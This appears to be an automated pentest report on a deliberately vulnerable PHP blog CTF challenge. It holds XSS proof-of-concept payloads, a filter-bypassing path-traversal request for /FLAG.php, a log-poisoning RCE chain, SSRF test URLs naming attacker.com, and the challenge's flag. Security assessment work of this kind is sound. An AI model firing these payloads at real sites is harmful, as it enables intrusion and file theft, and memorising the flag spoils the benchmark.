The application directory structure is organized as follows: The `app/` directory contains a single `Dockerfile` and a nested `website/` subdirectory housing all PHP application code. Within `website/`, the four primary endpoint PHP files (index.php, post.php, contact.php, about.php) reside at the root level with no routing abstraction. Two subdirectories provide organizational structure: `posts/` contains seven blog post PHP files that serve as both data and view templates, and `include/` houses two reusable components (navigation-bar.php and sidebar.php) that are PHP-included in all pages. A `static/images/` directory stores blog post imagery (WebP and JPG formats), and a `posts.json` file at the website root acts as a flat-file database for blog metadata.

**Build orchestration** uses a Makefile pattern referencing `../common.mk` (not present in this workspace), suggesting this challenge is part of a larger CTF infrastructure with shared build tooling. The benchmark.json file in the project root appears to be CTF platform metadata for automated testing. **No dependency management files exist** (no composer.json, no package.json, no requirements.txt), indicating zero third-party PHP libraries beyond the base Docker image. **No testing frameworks** are present (no PHPUnit, no tests/ directory), and **no code generation tools** are employed.

From a security discoverability perspective, this flat structure has both advantages and disadvantages. **Advantages include:** All attack surface code is immediately visible in a single `website/` directory with no framework routing obfuscation, the file-based post storage makes content enumeration trivial via posts.json, and the absence of MVC separation means business logic and security controls are colocated (easy to audit for gaps). **Disadvantages include:** No centralized input validation library (each endpoint implements ad-hoc validation leading to inconsistencies), no framework-provided security middleware (CSRF, XSS filters, rate limiting must be manually implemented), and the flat structure provides no architectural guidance for secure coding patterns. The lack of an `include/` security library or `lib/` utility directory suggests no reusable security components exist, forcing each script to reinvent validation and sanitization logic.

**Significant security-impacting conventions:** The application uses **PHP short tags** (`<? include(...) ?>` instead of `<?php include(...) ?>`) in multiple files (navigation-bar.php, sidebar.php, about.php), creating portability issues if `short_open_tag` is disabled in php.ini. The blog post files use a **heredoc syntax pattern** for content storage (`$post_content = <<<'EOD'...'EOD';`) which safely prevents variable interpolation but couples data and code in executable PHP files. The **world-writable Apache log configuration** (chmod 0777 in Dockerfile line 16) is a glaring operational security failure enabling log poisoning attacks. The **flag storage at container root** (`/FLAG.php`) rather than within `/var/www/html/` suggests intentional CTF design to require path traversal exploitation, as direct web access would fail (file outside DocumentRoot).

---

## 8. Critical File Paths

All file paths referenced in this analysis, categorized by security relevance:

### Configuration
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-079-24/.env` (flag storage, environment variables)
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-079-24/docker-compose.yml` (service orchestration, build args)
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-079-24/app/Dockerfile` (container build, flag deployment, log permissions)
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-079-24/Makefile` (build automation)
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-079-24/benchmark.json` (CTF metadata)

### Authentication & Authorization
- NONE (no authentication system exists)

### API & Routing
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-079-24/app/website/index.php` (blog listing, pagination)
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-079-24/app/website/post.php` (blog post viewer, **LFI vulnerability**)
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-079-24/app/website/contact.php` (contact form, **XSS vulnerabilities**)
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-079-24/app/website/about.php` (static about page)

### Data Models & DB Interaction
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-079-24/app/website/posts.json` (blog metadata schema)
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-079-24/app/website/posts/ScriptKiddie.php` (blog post content)
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-079-24/app/website/posts/EternalBlue.php` (blog post content)
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-079-24/app/website/posts/Introduction-to-Machine-Learning.php` (blog post content)
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-079-24/app/website/posts/The-Importance-of-Cybersecurity.php` (blog post content)
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-079-24/app/website/posts/Advances-in-Renewable-Energy.php` (blog post content)
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-079-24/app/website/posts/Blockchain-Technology.php` (blog post content)
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-079-24/app/website/posts/Future-of-AI.php` (blog post content)

### Dependency Manifests
- NONE (no composer.json, no package.json, no requirements.txt)

### Sensitive Data & Secrets Handling
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-079-24/.env` (flag in plaintext)
- `/FLAG.php` (container filesystem, flag storage location - accessible via LFI)
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-079-24/app/Dockerfile` (lines 18-19, flag deployment logic)

### Middleware & Input Validation
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-079-24/app/website/post.php` (lines 6-7, **bypassable path traversal filter**)
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-079-24/app/website/contact.php` (lines 9-27, minimal validation)
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-079-24/app/website/index.php` (line 10, secure integer casting)

### Logging & Monitoring
- `/var/log/apache2/access.log` (world-writable log file, chmod 0777 configured in Dockerfile line 16)
- `/var/log/apache2/error.log` (default Apache error log)

### Infrastructure & Deployment
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-079-24/app/Dockerfile` (container definition, security configs)
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-079-24/docker-compose.yml` (service orchestration, port mapping)
- NONE (no nginx.conf, no Kubernetes manifests, no Terraform/Pulumi IaC)

### CTF Flag Storage
- `/FLAG.php` (primary flag location in container root)
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-079-24/.env` (flag source file)
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-079-24/app/Dockerfile` (lines 18-19, flag deployment mechanism)
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-079-24/app/website/index.php` (line 36, Base64-encoded hint: `e0knbV9hX1NjcmlwdF9LaWRkaWV9`)

### UI Components
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-079-24/app/website/include/navigation-bar.php` (reusable navigation component)
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-079-24/app/website/include/sidebar.php` (reusable sidebar with JavaScript)

### Static Assets
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-079-24/app/website/static/images/` (blog post images directory)
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-079-24/app/website/static/images/script_kiddie.jpg`
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-079-24/app/website/static/images/EternalBlue.webp`
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-079-24/app/website/static/images/Cybersecurity.webp`
- (Additional WebP image files for all blog posts)

---

## 9. XSS Sinks and Render Contexts

**Network Surface Focus:** This analysis covers only XSS sinks in network-accessible web application pages (index.php, post.php, contact.php, about.php). No XSS sinks exist in out-of-scope components (build tools, Dockerfile, Makefile).

### Critical XSS Vulnerabilities (Exploitable)

#### Sink 1: Reflected XSS - Contact Form Name Field
- **File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-079-24/app/website/contact.php`
- **Lines:** 12 (input capture), 66 (output sink)
- **Severity:** HIGH
- **Render Context:** HTML Attribute Context (input value attribute)
- **User Input Source:** `$_POST["name"]`
- **Data Flow:**
  1. Line 7: Form submission via POST
  2. Line 12: `$name = trim($_POST["name"]);` (only whitespace removal, no sanitization)
  3. Line 66: `<input type="text" name="name" value="<?php echo $name; ?>">`
- **Current Protection:** NONE - No `htmlspecialchars()` or equivalent encoding
- **Exploitability:** HIGH - Direct reflection in HTML attribute
- **Code:**
```php
// Line 12: Input capture
$name = trim($_POST["name"]);

// Line 66: Vulnerable output
<input type="text" name="name" class="form-control" value="<?php echo $name; ?>">
```
- **Proof of Concept Payload:**
```
POST /contact.php
name="><script>alert(document.cookie)</script><input value="
email=test@example.com
message=test
```
- **Impact:** JavaScript execution in victim's browser, potential session hijacking (if sessions existed), phishing attacks, credential theft

#### Sink 2: Reflected XSS - Contact Form Email Field
- **File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-079-24/app/website/contact.php`
- **Lines:** 19 (input capture), 71 (output sink)
- **Severity:** HIGH
- **Render Context:** HTML Attribute Context (input value attribute)
- **User Input Source:** `$_POST["email"]`
- **Data Flow:**
  1. Line 19: `$email = trim($_POST["email"]);` (only whitespace removal)
  2. Line 71: `<input type="email" name="email" value="<?php echo $email; ?>">`
- **Current Protection:** NONE
- **Exploitability:** HIGH
- **Code:**
```php
// Line 19: Input capture
$email = trim($_POST["email"]);

// Line 71: Vulnerable output
<input type="email" name="email" class="form-control" value="<?php echo $email; ?>">
```
- **Proof of Concept Payload:**
```
POST /contact.php
name=John
email=test@test.com" onfocus="alert(1)" autofocus="
message=test
```
- **Alternative Payload (attribute breakout):**
```
email="><img src=x onerror=alert(document.domain)>
```

#### Sink 3: Reflected XSS - Contact Form Message Field
- **File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-079-24/app/website/contact.php`
- **Lines:** 26 (input capture), 76 (output sink)
- **Severity:** HIGH
- **Render Context:** HTML Body Context (textarea element)
- **User Input Source:** `$_POST["message"]`
- **Data Flow:**
  1. Line 26: `$message = trim($_POST["message"]);`
  2. Line 76: `<textarea name="message" class="form-control"><?php echo $message; ?></textarea>`
- **Current Protection:** NONE
- **Exploitability:** HIGH
- **Code:**
```php
// Line 26: Input capture
$message = trim($_POST["message"]);

// Line 76: Vulnerable output
<textarea name="message" class="form-control" rows="6"><?php echo $message; ?></textarea>
```
- **Proof of Concept Payload:**
```
POST /contact.php
name=John
email=test@test.com
message=</textarea><script>alert(document.cookie)</script><textarea>
```
- **Alternative Payload (HTML injection):**
```
message=<img src=x onerror=alert(document.cookie)>
```

### Medium-Risk XSS Sinks

#### Sink 4: Stored/Reflected XSS - Post Content
- **File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-079-24/app/website/post.php`
- **Line:** 51
- **Severity:** MEDIUM
- **Render Context:** HTML Body Context
- **User Input Source:** `$post_content` (from included PHP files)
- **Data Flow:**
  1. Line 4: `$post_id = $_GET['id'];` (user-controlled filename)
  2. Line 11: `include($file_to_include);` (includes PHP file that sets `$post_content`)
  3. Line 51: `<div class="post-content"><?= $post_content; ?></div>` (outputs HTML)
- **Current Protection:** NONE - Content is output as raw HTML
- **Exploitability:** MEDIUM - Requires chaining with LFI vulnerability to include malicious file
- **Code:**
```php
// Line 11: File inclusion (LFI vulnerable)
include($file_to_include);

// Line 51: Raw HTML output
<?= $post_content; ?>
```
- **Attack Scenario:**
  1. Attacker exploits LFI to include a file containing malicious `$post_content`
  2. Options: Include poisoned Apache log, include uploaded file, include /proc/self/environ with injected PHP
  3. Malicious content renders with XSS payload
- **Note:** This is by design (blog posts intentionally contain HTML), but combined with LFI, becomes exploitable

### Low-Risk/Non-Exploitable Sinks

#### Sink 5-7: Error Message Output (Not Exploitable)
- **File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-079-24/app/website/contact.php`
- **Lines:** 67 (name_err), 72 (email_err), 77 (message_err)
- **Severity:** LOW (not exploitable in current code)
- **Render Context:** HTML Body Context (span element)
- **User Input Source:** `$name_err`, `$email_err`, `$message_err` (internally controlled)
- **Code:**
```php
// Lines 10, 17, 24: Hardcoded error messages
$name_err = "Please enter your name.";
$email_err = "Please enter your email address.";
$message_err = "Please enter your message.";

// Lines 67, 72, 77: Output without encoding
<span class="error"><?php echo $name_err; ?></span>
```
- **Exploitability:** LOW - Error messages are hardcoded strings, no user input flows to these variables
- **Future Risk:** If error messages are ever changed to include user input (e.g., "Please enter a valid name for: [USER_INPUT]"), these become exploitable

#### Sink 8: Success Message (Not Exploitable)
- **File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-079-24/app/website/contact.php`
- **Line:** 83
- **Severity:** LOW
- **Render Context:** HTML Body Context
- **Code:**
```php
// Line 31: Hardcoded success message
$succ_message = "<h3>Thank you for contacting us, we will get back to you shortly.</h3>";

// Line 83: Output
<?php } else { echo $succ_message; }?>
```
- **Exploitability:** LOW - Success message is hardcoded HTML

#### Sink 9: Pagination Links (Secure)
- **File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-079-24/app/website/index.php`
- **Line:** 61
- **Severity:** NONE (secure implementation)
- **Render Context:** HTML Attribute Context (href) and HTML Body Context (link text)
- **User Input Source:** `$_GET['page']` (but properly sanitized)
- **Code:**
```php
// Line 10: Type casting to integer (SECURE)
$page = isset($_GET['page']) ? (int)$_GET['page'] : 1;

// Line 61: Output uses loop variable $i, NOT user input
<a class="page-link" href="?page=<?= $i; ?>"><?= $i; ?></a>
```
- **Protection:** Input is cast to integer, and output uses loop variable (not direct user input)
- **Exploitability:** NONE - Proper input validation prevents XSS

### Secure Output Patterns (No Vulnerabilities)

#### Blog Post Metadata (Secure)
- **File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-079-24/app/website/index.php`
- **Lines:** 48, 50-52
- **Code:**
```php
<img src="<?= htmlspecialchars($post['image_url']); ?>" alt="Post Image">
<h2 class="card-title"><?= htmlspecialchars($post['title']); ?></h2>
<p class="card-text"><?= htmlspecialchars($post['content']); ?></p>
<p><small class="text-muted"><?= htmlspecialchars($post['upload_date']); ?></small></p>
```
- **Assessment:** SECURE - Proper use of `htmlspecialchars()` for all output

#### Form Action URL (Secure)
- **File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-079-24/app/website/contact.php`
- **Line:** 63
- **Code:**
```php
<form action="<?php echo htmlspecialchars($_SERVER["PHP_SELF"]); ?>" method="post">
```
- **Assessment:** SECURE - `$_SERVER["PHP_SELF"]` properly encoded to prevent XSS

### DOM-Based XSS Analysis

#### JavaScript innerHTML Usage (Secure)
- **File:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-079-24/app/website/include/sidebar.php`
- **Lines:** 52-68
- **Code:**
```javascript
const countries = ["Argentina", "Poland", "USA", "Canada", "Brazil", ...]; // Static array
// ...
ul.innerHTML = ""; // Clear operation (safe)
selectedCountries.forEach(country => {
    const li = document.createElement('li');
    li.innerText = country;  // Uses innerText, NOT innerHTML - SECURE
    ul.appendChild(li);
});
```
- **Assessment:** SECURE - Uses `innerText` instead of `innerHTML` for dynamic content, and data source is static array (no user input)

### XSS Summary

**Total XSS Sinks Identified:** 9
- **HIGH Severity (Exploitable):** 3
  1. Contact form name field (line 66)
  2. Contact form email field (line 71)
  3. Contact form message field (line 76)
- **MEDIUM Severity (Chain Exploit Required):** 1
  4. Post content output (line 51) - requires LFI chain
- **LOW Severity (Not Currently Exploitable):** 5
  5-7. Error message outputs (hardcoded strings)
  8. Success message (hardcoded HTML)
  9. Pagination links (secure implementation)

**Primary Attack Vector:** Contact form (contact.php) with three exploitable reflected XSS vulnerabilities requiring no authentication or LFI chain.

**Recommended Remediation:**
1. **Immediate:** Apply `htmlspecialchars($variable, ENT_QUOTES, 'UTF-8')` to all user input before output in contact.php lines 66, 71, 76
2. **High Priority:** Implement Content Security Policy (CSP) header: `Content-Security-Policy: default-src 'self'; script-src 'self' cdn.jsdelivr.net`
3. **Medium Priority:** Add input validation (length limits, character whitelists) to contact form
4. **Low Priority:** Consider implementing CSRF tokens to prevent automated XSS exploitation

---

## 10. SSRF Sinks

**Network Surface Focus:** This analysis covers only SSRF sinks in network-accessible web application pages. No SSRF sinks exist in out-of-scope build scripts or local utilities.

### Finding: NO SSRF VULNERABILITIES IDENTIFIED

After comprehensive analysis of all network-accessible PHP files, **NO Server-Side Request Forgery (SSRF) sinks were found** in the Encoder64 Blog application.

### Detailed Analysis by Category

#### HTTP(S) Clients - NOT EXPLOITABLE

**file_get_contents() Usage:**
- **Location:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-079-24/app/website/index.php` line 3
- **Code:** `$json_data = file_get_contents('posts.json');`
- **Analysis:** Hardcoded filename only, no user input involved
- **SSRF Risk:** NONE

**Other HTTP Client Functions:**
- `curl_init()`, `curl_exec()`, `curl_setopt()` - NOT FOUND in application code
- `fopen()` with URL wrappers - NOT FOUND
- `fsockopen()`, `pfsockopen()` - NOT FOUND
- `stream_context_create()` - NOT FOUND
- HTTP libraries (Guzzle, Symfony HTTP) - NOT PRESENT (no Composer dependencies)

#### File Inclusion Functions - PROTECTED AGAINST SSRF

**include() in post.php (LFI Vulnerable, NOT SSRF):**
- **Location:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-079-24/app/website/post.php` line 11
- **Code:**
```php
$post_id = $_GET['id'];
$posts_path = "posts/";
$post_id = str_replace(['../', './', '..\\', '.\\'], '', $post_id);
$file_to_include = $posts_path . $post_id;

if (file_exists($file_to_include)) {
    include($file_to_include);
}
```
- **User Input:** `$_GET['id']` flows to `include()` function
- **PHP Configuration Protection:** `allow_url_include = Off` (confirmed from recon)
  - This setting prevents `include()` and `require()` from accessing URL schemes (http://, https://, ftp://)
  - Even though `allow_url_fopen = On`, this only affects functions like `file_get_contents()`, NOT `include()`
  
- **SSRF Attack Attempts Would Fail:**
```php
// These payloads would NOT work due to allow_url_include = Off:
GET /post.php?id=http://internal-service/api
GET /post.php?id=https://169.254.169.254/latest/meta-data/
GET /post.php?id=ftp://attacker.com/payload.php
```

- **Vulnerability Type:** Local File Inclusion (LFI) - YES
- **SSRF Risk:** NO (cannot use URL wrappers)

#### Raw Sockets & Network Connections - NOT FOUND
- `socket_create()`, `socket_connect()` - NOT FOUND
- `stream_socket_client()` - NOT FOUND

#### Redirect & Location Headers - NOT FOUND
- `header("Location: ")` with user input - NOT FOUND
- No "return URL" or "next" parameters in application

#### XML/Image/Media Processors - NOT FOUND
- `simplexml_load_file()`, `simplexml_load_string()` - NOT FOUND
- `DOMDocument` - NOT FOUND
- `getimagesize()`, `imagecreatefrom*()` - NOT FOUND
- `exif_read_data()` - NOT FOUND

#### Link Preview/Webhook/OAuth - NOT FOUND
- No link unfurling functionality
- No webhook testing features
- No OAuth/OIDC discovery endpoints (no authentication system)

#### Data Import/Package Installers - NOT FOUND
- No "Import from URL" features
- No plugin/theme installation functionality

### User Input Analysis (SSRF Context)

**All User Input Points Evaluated for SSRF:**

1. **`$_GET['page']` (index.php line 10):**
   - Flow: Cast to integer → used in pagination logic
   - Never reaches any network function
   - SSRF Risk: NONE

2. **`$_GET['id']` (post.php line 4):**
   - Flow: String replacement → `include()`
   - `allow_url_include = Off` prevents URL wrapper usage
   - SSRF Risk: NONE (LFI only)

3. **`$_POST['name']`, `$_POST['email']`, `$_POST['message']` (contact.php):**
   - Flow: Validation → display only (no external requests)
   - Data never sent to external services
   - SSRF Risk: NONE

4. **`$_SERVER['PHP_SELF']` (contact.php line 63):**
   - Flow: Passed through `htmlspecialchars()` for display only
   - No network requests
   - SSRF Risk: NONE

### PHP Configuration Assessment

**Relevant PHP Settings (from recon analysis):**
```ini
allow_url_fopen = On         # Allows file_get_contents() to access URLs
allow_url_include = Off      # Prevents include()/require() from accessing URLs
disable_functions = (none)   # All functions available
open_basedir = (none)        # No filesystem restrictions
```

**SSRF Implications:**
- `allow_url_fopen = On` means `file_get_contents()` COULD access URLs if user input reached it
- However, NO code paths exist where user input reaches `file_get_contents()` or similar functions
- `allow_url_include = Off` provides defense-in-depth against URL-based file inclusion
- Curl extension is present but NEVER USED in application code

### SSRF Attack Surface: NONE

**Conclusion:** The application does not contain Server-Side Request Forgery vulnerabilities because:
1. No HTTP client functions are called with user-controlled input
2. `file_get_contents()` only reads static local files
3. `include()` is protected by `allow_url_include = Off` PHP configuration
4. Contact form doesn't trigger external requests (no email sending, no API calls)
5. No webhook, OAuth, link preview, or external integration features exist
6. No image/media processing with remote URLs
7. No redirect functionality with user-controlled destinations

### False Positive Analysis

**Why post.php include() is NOT SSRF:**

The Local File Inclusion vulnerability in `post.php` might appear SSRF-exploitable, but it is definitively NOT because:

1. **PHP Configuration Protection:**
   - `allow_url_include = Off` explicitly disables URL wrappers in include/require functions
   - This setting is separate from `allow_url_fopen` (which only affects fopen, file_get_contents, etc.)

2. **Attempted SSRF Exploits Would Fail:**
```bash
# These would all fail with "failed to open stream" errors:
curl http://localhost/post.php?id=http://internal-service/
curl http://localhost/post.php?id=https://169.254.169.254/latest/meta-data/
curl http://localhost/post.php?id=ftp://attacker.com/shell.php
```

3. **What IS Vulnerable:**
   - Local File Inclusion (LFI) - YES (can read local files like /FLAG.php, /etc/passwd)
   - Server-Side Request Forgery (SSRF) - NO (cannot make HTTP requests)

### Recommendations for SSRF Prevention (Defense-in-Depth)

While no SSRF vulnerabilities currently exist, the following hardening measures are recommended:

1. **Maintain `allow_url_include = Off`** in php.ini (currently configured correctly)
2. **Consider disabling `allow_url_fopen`** if URL access is not needed: `allow_url_fopen = Off`
3. **Implement `open_basedir` restriction** to limit file access: `open_basedir = /var/www/html`
4. **If future features require HTTP requests**, implement:
   - URL whitelist validation (only allow known-safe domains)
   - Deny private IP ranges (10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, 127.0.0.0/8, 169.254.0.0/16)
   - Deny localhost and loopback addresses
   - Use `gethostbyname()` to resolve and validate destination IPs before making requests

---

**CONCLUSION:** No SSRF testing required for this application. The attack surface for Server-Side Request Forgery is non-existent. Penetration testing efforts should focus on the confirmed Local File Inclusion vulnerability in `post.php` and the reflected XSS vulnerabilities in `contact.php`.

---

## Summary & Recommendations

### Critical Findings Summary

1. **CRITICAL: Local File Inclusion (LFI) - post.php**
   - **Location:** `/app/website/post.php` lines 6-11
   - **Vulnerability:** Bypassable path traversal filter using single-pass `str_replace()`
   - **Exploit:** `GET /post.php?id=....//....//FLAG.php`
   - **Impact:** Arbitrary file read including `/FLAG.php`, `/etc/passwd`, log files
   - **CVSS 3.1 Score:** 7.5 HIGH (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)

2. **HIGH: Reflected XSS - Contact Form (3 vulnerabilities)**
   - **Location:** `/app/website/contact.php` lines 66, 71, 76
   - **Vulnerability:** User input echoed without `htmlspecialchars()` encoding
   - **Impact:** JavaScript execution, potential session hijacking (limited by lack of authentication)
   - **CVSS 3.1 Score:** 6.1 MEDIUM (AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)

3. **HIGH: World-Writable Apache Logs**
   - **Location:** Dockerfile line 16 - `chmod 0777 /var/log/apache2/access.log`
   - **Vulnerability:** Allows log injection and log tampering
   - **Exploit Chain:** Log poisoning + LFI = RCE (inject PHP in User-Agent → include access.log)
   - **CVSS 3.1 Score:** 7.3 HIGH (if chained with LFI)

4. **HIGH: Flag Exposed in Docker Image Layers**
   - **Location:** Dockerfile line 18 - `ARG FLAG`
   - **Vulnerability:** Build arguments persist in image metadata
   - **Exploit:** `docker history <image_id>` reveals flag in build commands
   - **Impact:** Direct flag extraction without exploiting application vulnerabilities

5. **MEDIUM: Flag in Version Control Risk**
   - **Location:** `.env` file with plaintext flag
   - **Risk:** May be committed to Git repository
   - **Recommendation:** Verify .gitignore contains .env entry

6. **MEDIUM: End-of-Life PHP Version**
   - **Version:** PHP 7.4.33 (EOL: November 28, 2022)
   - **Impact:** No security patches for newly discovered vulnerabilities
   - **Recommendation:** Upgrade to PHP 8.2 or 8.3

7. **MEDIUM: Missing Security Headers**
   - **Missing:** CSP, X-Frame-Options, X-Content-Type-Options, HSTS, Referrer-Policy
   - **Impact:** Increased XSS, clickjacking, MIME sniffing risks
   - **Location:** No Apache security header configuration in Dockerfile

8. **MEDIUM: HTTP-Only (No HTTPS/TLS)**
   - **Configuration:** Dockerfile exposes port 80 only
   - **Impact:** All data transmitted in plaintext (network eavesdropping)
   - **Recommendation:** Deploy behind reverse proxy with TLS termination

### Positive Security Findings

1. **No SSRF Vulnerabilities:** `allow_url_include = Off` prevents URL-based file inclusion
2. **Proper Output Encoding in Blog Listing:** `htmlspecialchars()` correctly used in index.php
3. **Secure Pagination:** Integer type casting prevents injection in page parameter
4. **Minimal Attack Surface:** No database (no SQLi), no file uploads, no authentication complexity
5. **No External Dependencies:** No third-party library vulnerabilities

### Attack Chain for Flag Extraction

**Primary Path (LFI Exploitation):**
```
1. Identify LFI vulnerability: GET /post.php?id=test
2. Bypass filter: Craft payload ....//....//FLAG.php
3. Execute: GET /post.php?id=....//....//FLAG.php
4. Retrieve flag: flag{1939e32c-72e2-4691-8272-cbe431165ad0}
```

**Alternative Path (Docker Image Inspection):**
```
1. Obtain Docker image (if accessible)
2. Inspect layers: docker history xben-079-24:latest
3. Locate flag in build commands: RUN echo "<?php flag{...} ?>"
4. Extract flag directly from image metadata
```

### Remediation Priorities

**Priority 1 (Critical - Immediate Action):**
1. Fix LFI vulnerability in post.php:
   - Implement whitelist validation against posts.json entries
   - Use `basename()` to strip directory components: `$post_id = basename($_GET['id']);`
   - Validate file extension: ensure ends with `.php`
   
2. Secure flag storage:
   - Remove flag from Docker ARG (use runtime ENV instead)
   - Mount flag as Docker secret at runtime
   - Add .env to .gitignore and remove from version control history

3. Fix Apache log permissions:
   - Change from 0777 to 0644: `chmod 644 /var/log/apache2/access.log`

**Priority 2 (High - Within 1 Week):**
4. Fix XSS in contact.php:
   - Apply `htmlspecialchars($var, ENT_QUOTES, 'UTF-8')` to lines 66, 71, 76
   
5. Implement security headers:
   - Add CSP: `Content-Security-Policy: default-src 'self'; script-src 'self' cdn.jsdelivr.net`
   - Add X-Frame-Options: `X-Frame-Options: DENY`
   - Add X-Content-Type-Options: `X-Content-Type-Options: nosniff`

6. Upgrade PHP version:
   - Change Dockerfile base image to `php:8.2-apache` or `php:8.3-apache`

**Priority 3 (Medium - Within 1 Month):**
7. Enable HTTPS:
   - Deploy behind reverse proxy (Nginx/Caddy) with TLS certificate
   - Redirect HTTP to HTTPS
   - Add HSTS header: `Strict-Transport-Security: max-age=31536000`

8. Implement CSRF protection:
   - Add CSRF token generation and validation to contact form

9. Add rate limiting:
   - Implement request throttling on contact form and post.php endpoints

**Priority 4 (Low - Future Enhancement):**
10. Implement proper error handling:
    - Remove `error_reporting(0)` suppression
    - Log errors to file instead of displaying to users
    - Implement custom error pages

### Penetration Testing Focus Areas

**For subsequent agents in the assessment workflow:**

1. **Injection Analysis Agent:** Prioritize LFI testing in post.php (lines 6-11) - bypass filter variations, log poisoning chains
2. **XSS Analysis Agent:** Focus on contact.php (lines 66, 71, 76) - test reflected XSS payloads, CSP bypass techniques
3. **Authentication Analysis Agent:** Document complete absence of authentication (no testing required)
4. **Authorization Analysis Agent:** Document lack of access controls (no testing required)
5. **SSRF Analysis Agent:** No SSRF attack surface exists (skip testing)

### CTF-Specific Notes

This application is intentionally vulnerable as a CTF challenge. The flag extraction path is:
1. **Primary intended solution:** LFI bypass → read /FLAG.php
2. **Alternative solution:** Docker image inspection (if image access provided)
3. **Hint location:** Base64 string on homepage (index.php line 36): `e0knbV9hX1NjcmlwdF9LaWRkaWV9` decodes to `{I'm_a_Script_Kiddie}` (thematic hint)

---

**End of Code Analysis Report**

## Authenticated Scans

### SCHEMATHESIS
Status: success
Schema: blog_posts_schema.json
Error: Schemathesis v4.1.4
━━━━━━━━━━━━━━━━━━━


 ❌  Failed to load specification from                                          
 /Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-079-24/outputs/schemas/bl 
 og_posts_schema.json after 0.36s                                               
                                                                                
 Schema Loading Error                                                           
                                                                                
 The provided API schema does not appear to be a valid OpenAPI schema           



---
Report generated at: 2025-10-31T18:10:49.098Z